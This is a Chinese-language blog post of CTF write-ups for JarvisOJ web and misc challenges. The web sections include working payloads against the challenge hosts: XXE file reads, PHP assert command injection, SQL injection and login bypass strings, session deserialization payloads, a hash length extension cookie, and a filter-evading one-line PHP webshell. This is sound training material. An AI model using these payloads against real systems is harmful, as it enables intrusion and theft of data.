---
layout: post
title: "JARVISOJ Writeup"
categories: ctf jarvisoj
tags: ctf writeup jarvisoj
---
# Web

### 100-port51

![100-port51]({{ site.url }}/assets/img/ctf/jarvisoj/web/100-port51.png)

> http://web.jarvisoj.com:32770/

访问后提示`Please use port 51 to visit this site.`。

要强制使用指定的本地端口，可以使用`curl`命令。

```shell
curl --local-port 51 http://web.jarvisoj.com:32770/
```

> 但是似乎本题不能存在NAT，需要公网设备访问。



### 100-api调用

![100-api调用]({{ site.url }}/assets/img/ctf/jarvisoj/web/100-api调用.png)

> http://web.jarvisoj.com:9882/

这题是一个json数据传输。

![100-api调用-1]({{ site.url }}/assets/img/ctf/jarvisoj/web/100-api调用-1.png)

随意输入后并没有明显特征，查阅后是json的xxe攻击。

构造payload，然后获得flag。

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>
```

[1]: http://blog.csdn.net/qq_31481187/article/details/53189113#0x09-api调用	"包含jarvisoj web大部分题目"
[2]: http://bobao.360.cn/learning/detail/360.html	"json的xxe漏洞"
[3]: D:\security\mynote\web\other\json的xxe攻击.md	"自己的xxe漏洞笔记"



### 150-WEB?

> 这么简单的题，是WEB么？
>
> http://web.jarvisoj.com:9891/

首页很简单，就一个pass输入框，但是首页的代码却没有任何密码元素标签，而是插入了一个`app.js`的脚本。将该文件代码格式化，竟然有2w多行。

根据错误输入的提示`Wrong Password!!`在`app.js`中查找，可以定位到关键位置：

```javascript
        key: "__handleTouchTap__REACT_HOT_LOADER__",
        value: function() {
            var e = this.state.passcontent,
            t = {
                passowrd: e
            };
            self = this,
            $.post("checkpass.json", t,
            function(t) {
                self.checkpass(e) ? self.setState({
                    errmsg: "Success!!",
                    errcolor: b.green400
                }) : (self.setState({
                    errmsg: "Wrong Password!!",
                    errcolor: b.red400
                }), setTimeout(function() {
                    self.setState({
                        errmsg: ""
                    })
                },
                3e3))
            })
        }
```
然后查找`checkpass`关键函数：

```javascript
        key: "__checkpass__REACT_HOT_LOADER__",
        value: function(e) {
            if (25 !== e.length) return ! 1;
            for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));
            for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {
                for (var i = 0,
                a = 0; a < 25; a++) i += t[a] * o[n][a];
                if (i !== r[n]) return ! 1
            }
            return ! 0
        }
```
这一看是一个25元一次方程组，用python的numpy依赖求解。

> 脚本：web.py

### 150-localhost

![150-localhost]({{ site.url }}/assets/img/ctf/jarvisoj/web/150-localhost.png)

> http://web.jarvisoj.com:32774/

访问后提示`localhost access only!!`。

修改`x-forwarded-for:127.0.0.1`即可。



### 200-[61dctf]babyphp

> 题目入口：<http://web.jarvisoj.com:32798/>
>
> Hint1: 此题缺少关键解题文件的问题已修复。

根据about页面的提示，网站使用了git，用githack获取源码，虽然flag.php也被下载了，但是git中不一定是最新的。利用首页的assert指令，可以执行system或show_source等危险函数。

```http
http://web.jarvisoj.com:32798/?page=flag'.system("cat templates/flag.php").'	//需查看源码
http://web.jarvisoj.com:32798/?page=flag'.show_source("templates/flag.php").'
```



### 250-Login

> 需要密码才能获得flag哦。
>
> 题目链接：<http://web.jarvisoj.com:32772/>

访问首页后，在返回包的header中有提示：`Hint: "select * from admin where password='".md5($pass,true)."'"`，查询php手册后发现该`md5(,true)`函数返回的是binary值而不是string值。查询后，得知`md5('ffifdyop',true)`的值为`'or'6蒥欓!r,b`，恰好可以闭合并绕过。



### 300-神盾局的秘密

> 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？
>
> 题目入口：<http://web.jarvisoj.com:32768/>

查看首页源码发现通过`showimg.php`读取了`shield.jpg`的内容，所以是个文件包含问题。先包含了`index.php`，没有任何过滤，发现是个反序列化问题；再包含`shield.php`，包含了`shield`类的定义，并且提示了flag在`pctf.php`中（如果直接访问`pctf.php`会告诉你一个假flag）。因为在`index.php`中反序列后会调用`readfile()`函数，因此直接将`shield`实例的`file`属性置为`pctf.php`即可。

```php
class shield{public $file;}
$x=new shield();
$x->file="pctf.php";
var_dump(serialize($x));
```

注：`showimg.php`中使用的是`readfile()`函数，因此只读取了文件内容而没有执行。



### 300-RE?

> 咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦
>
> [udf.so.02f8981200697e5eeb661e64797fc172](https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172)

这题下载了一个udf.so，file查看是elf文件。注意！根据文件名的提示，这是个mysql的user define function文件（不是个简单的.so文件），那么就是要在mysql中查看这些user define functions。

将文件导入/usr/lib/mysql/plugin/文件夹下

根据提示，在mysql中创建help_me函数

```mysql
create function help_me returns string soname 'udf.so';
select help_me();
```

提示让再创建getflag函数，即可拿到flag

```mysql
create function getflag returns string soname "udf.so";
select getflag();
```



### 300-PHPINFO

> 题目入口：<http://web.jarvisoj.com:32784/>

这题直接给了源码，其中有段重要代码，`ini_set('session.serialize_handler', 'php');`，查阅php session序列化处理器资料得知，当session的序列化和反序列化处理器设置不当时，存在安全隐患[3-4]。

检查phpinfo中几个关键参数：

| Directive                       | Local Value | Master Value  |
| ------------------------------- | ----------- | ------------- |
| session.auto_start              | Off         | Off           |
| session.serialize_handler       | php         | php_serialize |
| session.upload_progress.cleanup | Off         | Off           |
| session.upload_progress.enabled | On          | On            |

这时可以构造恶意上传，控制`$_SESSION`中的值，参考php manual[5]：

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

随意上传一个文件，抓包，其中的`filename`就是payload位置，需要改为`php`类型的序列化值，利用下面的代码分别构造`scandir()`和`file_get_contents()`的序列化payload。

```php
<?php
class OowoO
{
    public $mdzz;
    function __construct()
    {
       // $this->mdzz = 'phpinfo();';
        // $this->mdzz = 'print_r(scandir("/opt/lampp/htdocs"));'; 
        $this->mdzz = 'print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));';
    }
    
    function __destruct()
    {
        //eval($this->mdzz);
    }
}
$m = new OowoO();
echo serialize($m);
?>
```

将上述的序列化值作为payload覆盖之前抓包的`filename`参数，需要注意两点：（1）将`php_serialize`类型转为`php`类型序列化对象，需要在前面加一个`“|”`；（2）存在双引号，注意转义。

```http
filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:38:\"print_r(scandir(\"/opt/lampp/htdocs\"));\";}"
```

可查看`scandir()`内容。

```http
filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}"
```

可查看flag。

[1]: https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/index.html#PHPINFO	"chybeta的WP"
[2]: https://www.scanfsec.com/jarvisoj_web_writeup.html	"第二个wp"
[3]: http://www.tuicool.com/articles/zEfuEz	"php session序列化处理器概述及安全隐患"
[4]: http://www.91ri.org/15925.html	"php session反序列化漏洞2"
[5]: http://php.net/manual/zh/session.upload-progress.php	"php manual session.upload_process.enabled"



### 300-[61dctf]inject

> 题目入口：<http://web.jarvisoj.com:32794/>
>
> Hint1: 先找到源码再说吧~~

根据提示可以找到index.php~，对源码审计后关键语句如下：

```php
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
```

必须先绕过第一句，然后再注入第二句即可获得flag。查阅mysql手册，研究下desc语法（表存在，column不存在mysql返回empty set；表不存在，mysql报错），再利用反引号（\`）注入（连续的两个\`相当于一个空格，类似分隔符）。

爆表名：

```http
http://web.jarvisoj.com:32794/index.php?table=test` `where 1=2 union+select table_NAME from information_schema.tables limit 0,1
```

爆列名：

```http
http://web.jarvisoj.com:32794/index.php?table=test` `where 1=2 union+select column_NAME from information_schema.columns limit 0,1
```

爆flag：

```http
http://web.jarvisoj.com:32794/index.php?table=test` ` where 1=2  union select flagUwillNeverKnow from secret_flag
```



### 350-flag在管理员手里

> 只有管理员才能获得flag，你能想办法获得吗？
>
> 题目链接：<http://web.jarvisoj.com:32778/>

这题扫描后找到首页源码index.php~，是个vim swap文件，重命名为index.php.swp后可以用vim打开（为啥一定要先重命名呢，我也不理解）。

源码比较简单，就是要破解md5($salt.strrev('admin'))的值。应该不难想到，这是个md5拓展攻击。

首先，已经有`md5($salt.strrev(serialize('guest')))`的值，通过md5拓展攻击，我们可以计算得到`md5($salt.strrev(serialize('guest')).[padding].strrev(serialize('admin')))`，转化下就是`md5($salt.strrev(serialize('admin').strrev([padding]).serialize('guest')))`。而此时，因为`strrev([padding])`的起始数据都是`0x00`，所以`unserialize(serialize('admin').strrev([padding]).serialize('guest'))`恰好就是`admin`。最终，可以获得flag。

直接借用工具hash_extender[3]可以很方便的计算，由于`$salt`的长度未知，所以需要爆破将可能的值都提交尝试下，最后得到长度为12。

```shell
hash_extender -d ';"tseug":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -a ';"nimda":5:s' -l 12
Type: md5
Secret length: 12
New signature: fcdc3840332555511c4e4323f6decb07
New string: 3b227473657567223a353a738000000000000000000000000000000000000000000000000000000000000000c0000000000000003b226e696d6461223a353a73
```

```http
GET / HTTP/1.1
Host: web.jarvisoj.com:32778
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=uhb0efg1tspr6n5k9nredjvtp5;role=%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%73%3a%35%3a%22%67%75%65%73%74%22%3b;hsh=fcdc3840332555511c4e4323f6decb07
Connection: close
```



[1]: http://blog.csdn.net/qq_35078631/article/details/77284684#t7	"wp"
[2]: http://blog.csdn.net/syh_486_007/article/details/51228628	"hash拓展简单介绍"
[3]: https://github.com/iagox86/hash_extender	"hash拓展攻击工具以及hash拓展攻击（优质）示例"



### 350-Easy Gallery

> "没有什么防护是一个漏洞解决不了的，如果有，那
> 就.....
> "
>
> 题目入口：<http://web.jarvisoj.com:32785/>
>
> 题目来源：ISCC2016

这题感觉有点脑洞十足的意思。

首先，通过浏览网站，明显有文件包含和上传两个潜在的漏洞。想通过文件包含直接查看源代码并不成功，文件上传可以上传图片马。图片马上传之后通过view页面竟然找不到该图片！只好猜测路径是uploads/xxx.jpg，然后用文件包含加00截断漏洞来访问上传的图片马`http://web.jarvisoj.com:32785/index.php?page=uploads/1505014596.jpg%00`，会提示`You should not do this!`。猜测可能是其过滤了`<?php`等关键字，将小马内容换成`<script language="php">eval($_REQUEST[yzj]);</script>`可绕过过滤，获得flag。

注：

- 服务器用的apache，就我的知识面apache并没有xx.jpg%00.php这样的截断漏洞，所以想不通原理；
- script脚本形式的一句话马值得关注

### 350-Simple Injection

> 很简单的注入，大家试试？
>
> 题目入口：<http://web.jarvisoj.com:32787/>
>
> 题目来源：ISCC2016

ISCC貌似又是一个大脑洞！

没有任何提示的盲注，还过滤了空格、`and`和`or`（从返回根本看不出哪些被过滤了好么），替代方式包括：空格用`%0a`等，`and`用`&&`，`or`用`||`。

# MISC

### scan

> 有人在内网发起了大量扫描，而且扫描次数不止一次，请你从capture日志分析一下对方第4次发起扫描时什么时候开始的，请提交你发现包编号的sha256值(小写)。
>
> Hint1: 请提交PCTF{包编号的sha256}
>
> [capture.rar.520fff452096bc407fab4567ecfb6b86](https://dn.jarvisoj.com/challengefiles/capture.rar.520fff452096bc407fab4567ecfb6b86)

打开后发现虽然包数量很多，但是比较单纯，在做syn、fin等测试前都先ping了下主机，所以用icmp过滤出所有ping包，第4个Ping request就是（ip和前3个不一样）。



### 简单网管协议

> 分析压缩包中的数据包文件并获取flag。flag为32位小写md5。
>
> 题目来源：CFF2016
>
> [simple_protocol.rar.57175cf6f8e21242822fb828735b4155](https://dn.jarvisoj.com/challengefiles/simple_protocol.rar.57175cf6f8e21242822fb828735b4155)

这题比较有意思，因为直接用`tcp contains flag`并不能找到flag，因为题目提示说是简单网管协议，所以flag根本不在tcp数据包里。

用`ctrl+F`进行查询时，有3个选项：

- 分组列表：就是在第一个（最上面的）框中查询。基本就是在info字段查询，相当于包的一个摘要。
- 分组详情：在第二个（中间的）框中查询。所有网络协议本身的字段都将被解释，并查询，但是**数据包所携带的数据依然是Hex值**，无法查询。
- 分组字节流：在第三个（最下面的）框中查询。该框中会显示整个数据包的Hex和ascii值，因此所携带的数据也将被显示出来，是显示信息最全的。

这题flag就是在携带的数据里，因此只能用分组字节流才能找到，此时用`strings`命令效率最高。



### 远程登录协议

> 分析压缩包中的数据包文件并获取flag。flag为32位小写md5。
>
> 题目来源：CFF2016
>
> [telnet.rar.e7dedd279f225957aad6dc69e874eaae](https://dn.jarvisoj.com/challengefiles/telnet.rar.e7dedd279f225957aad6dc69e874eaae)

因为提示是telnet，所以分析简单很多，直接`telnet contains flag`，可以找到关键流量包，再tcp流跟踪下发现读取了flag.txt文件。



### misc100

> 题目来源：L-CTF
>
> [easy100.apk.515049fd54a763e929a8d6cb0034f249](https://dn.jarvisoj.com/challengefiles/easy100.apk.515049fd54a763e929a8d6cb0034f249)

标准的安卓逆向题，比较恶心的时候故意在类名和变量名是进行混淆。解题时有如下注意点：

- 负数值取byte在python里可以直接用-1&0xFF
- key在url.png图片里，但是加密前还做了一次换位，需注意
- 加密时，原题还做了很多utf-8转码等操作，而且AES本身就是以字节为单位进行运算的，所以解密是可以都忽略（这个也是看了他人wp才知道，如果也做转码工作，就出现padding错误）

解题脚本（python+java）：

```python
from Crypto.Cipher import AES
import base64

# c='15A3BCA25675EDBC3F213276100D01F1F3030467EE511E44363F2CE95D62053B'
c='15a3bca25675edbca4213276100d01f1f3030467ee511e4436a32ce95d62053b'
# assert c1==c2.upper()
key='htsii__sht_eek.y'

cipher=AES.new(key,AES.MODE_ECB)
print cipher.decrypt(c.decode('hex'))
```

```java
package serial.test;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class aa {
	private static SecretKeySpec x;
    private static Cipher y;

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		String key="htsii__sht_eek.y";
		byte[] s=new byte[]{(byte) 21, (byte) -93, (byte) -68, (byte) -94, (byte) 86, (byte) 117, (byte) -19, (byte) -68, (byte) -92, (byte) 33, (byte) 50, (byte) 118, (byte) 16, (byte) 13, (byte) 1, (byte) -15, (byte) -13, (byte) 3, (byte) 4, (byte) 103, (byte) -18, (byte) 81, (byte) 30, (byte) 68, (byte) 54, (byte) -93, (byte) 44, (byte) -23, (byte) 93, (byte) 98, (byte) 5, (byte) 59};
		try {
			aa.x = new SecretKeySpec(key.getBytes(), "AES");
	        aa.y = Cipher.getInstance("AES/ECB/PKCS5Padding");
			aa.y.init(Cipher.DECRYPT_MODE, aa.x);
			System.out.println(new String(aa.y.doFinal(s),"utf-8"));
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalBlockSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (BadPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
```



### shell流量分析

> 分析一下shell流量，得到flag
>
> 来源：HCTF2016
>
> [+_+.rar.977e2c637dc492fb9a7cf7595c852044](https://dn.jarvisoj.com/challengefiles/+_+.rar.977e2c637dc492fb9a7cf7595c852044)

提示了是分析shell流量，并且一共就2个流。第二个流中先读取了一个AES加解密python文件，最后`cat`了一个flag文件，内容为`mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==`，像base64但是测试了base全家桶解不出来，联想到可能是明文经过AES加密后再base64（python文件中也有`import base64`提示）。



### 150-炫酷的战队LOGO

> 欣赏过了实验室logo，有人觉得我们战队logo直接盗图比较丑，于是我就重新设计了一个，大家再欣赏下？
>
> [phrack.bmp.197c0ac62c8128bc4405a27eca3021b6](https://dn.jarvisoj.com/challengefiles/phrack.bmp.197c0ac62c8128bc4405a27eca3021b6)

这题显示一个bmp文件，说是文件头损坏，我是直接没看出来，只发现最后有个png，直接取出来后说IHDR段的crc32值错误，一看height值为0，想通过爆破计算出height值。

```python
import binascii
import struct
datas='\x00\x00\x00\x0D\x49\x48\x44\x52%s\x00\x00\x01\x00\x08\x02\x00\x00\x00'
for i in range(1,65535):
    d=datas%(struct.pack('>i',i),)
    print hex(binascii.crc32(d)&0xffffffff)
    if binascii.crc32(d)==0xf37a5e12:
        print i
        break
```

这题注意是大端编码，调整的是weight，可是跑不出结果。



### 250-Class 10

> 听说神盾局的网络被日穿之后，有人从里面挖出来一个神秘的文件，咋一看也没什么，可是这可是class10保密等级的哦，里面一定暗藏玄机，你能发现其中暗藏的玄机吗？
>
> [class10.1c40ca6a83c607f424c23402abe53981](https://dn.jarvisoj.com/challengefiles/class10.1c40ca6a83c607f424c23402abe53981)

这题附件下载打开后发现有PNG的数据结构体特征，但是文件头损坏了，找个正常的文件修复了下前4个字节。png图片打开后有假flag。再检查数据段发现最后有2个长度不是0x1000的结尾，说明（一般情况下）最后一段数据不属于原图片。

自己提取看不出是什么内容，用binwalk提取发现是一串二进制码，然后用python画图，发现29*29的图实在太小了，只能重新画，放大了10倍。

```python
from PIL import Image
s='0000000100111011010101000000001111101010100111011110111110010001011100100111110101000100100010100101001011101010001001000101111011000111110100010011111011100001000000101111100000000101010101010101000000011111111011111001101111111111100100001100110100100001101001010011110101000011110001111100110000111001010111001010001111111100000000011011011101101110000100001111000011110000111001010000010010011111111100100101000010010110001010111001110011010000000000000000000101010101010101000001010000100100101110010110110110010100111101100000100101101000011111111100010111001100011101110010010110000000111110100000011001111111111001000000001110111100000001001100011001010100111011111010010010001100111010000100010101101001010100000100001000101110101010101001001110010001010110100110010110110110111110100000101100011011010000000001111100001100011110011'

one=Image.new('1',(10,10),1)
zero=Image.new('1',(10,10),0)
im=Image.new('1',(290,290))
for y in range(29):
    for x in range(29):
        tmp=one if s[x+29*y]=='1' else zero
        im.paste(tmp,(10*x,10*y))
im.show()
```



### 300-Webshell分析

> 分析压缩包中的数据包文件并获取flag。flag为32位小写md5。
>
> 题目来源：CFF2016
>
> [findwebshell.rar.96e24e913b817b7503f85fd36e0a4f17](https://dn.jarvisoj.com/challengefiles/findwebshell.rar.96e24e913b817b7503f85fd36e0a4f17)

根据提示，直接搜`http contains shell`，然后能发现明显的shell马`icronshell.php`，分析后两个请求得到一个base64加密的地址，`https://dn.jarvisoj.com/challengefiles/AbTzA2YteFjGhPWCftraouVD3B684a9A.jpg`，访问后得到flag的二维码。



### 300-You Need Python

> 人生苦短我用Python。
>
> [题目：you_need_python.zip.74d515955b9aa607b488a48437591a14](https://dn.jarvisoj.com/challengefiles/%E9%A2%98%E7%9B%AE%EF%BC%9Ayou_need_python.zip.74d515955b9aa607b488a48437591a14)

这题用到了点python知识，翻官方手册可以学到不少东西。打开python文件后，分析代码，其他都好理解，有个marshal包不太熟悉，官方手册有如下介绍：

- This module contains functions that can read and write Python values in a binary format. 
- This is not a general “persistence” module. For general persistence and transfer of Python objects through RPC calls, see the modules pickle and shelve.
- The marshal module exists mainly to support reading and writing the “pseudo-compiled” code for Python modules of .pyc files.

简单点说，marshal包就是完成.pyc和python对象的转换。那么，其转换之前的就是.pyc内容，可以反编译出python源码。

尝试用WP推荐的uncompyle2和自己的pycdc都失败，magic number不对。

<!--

# Crypto



-->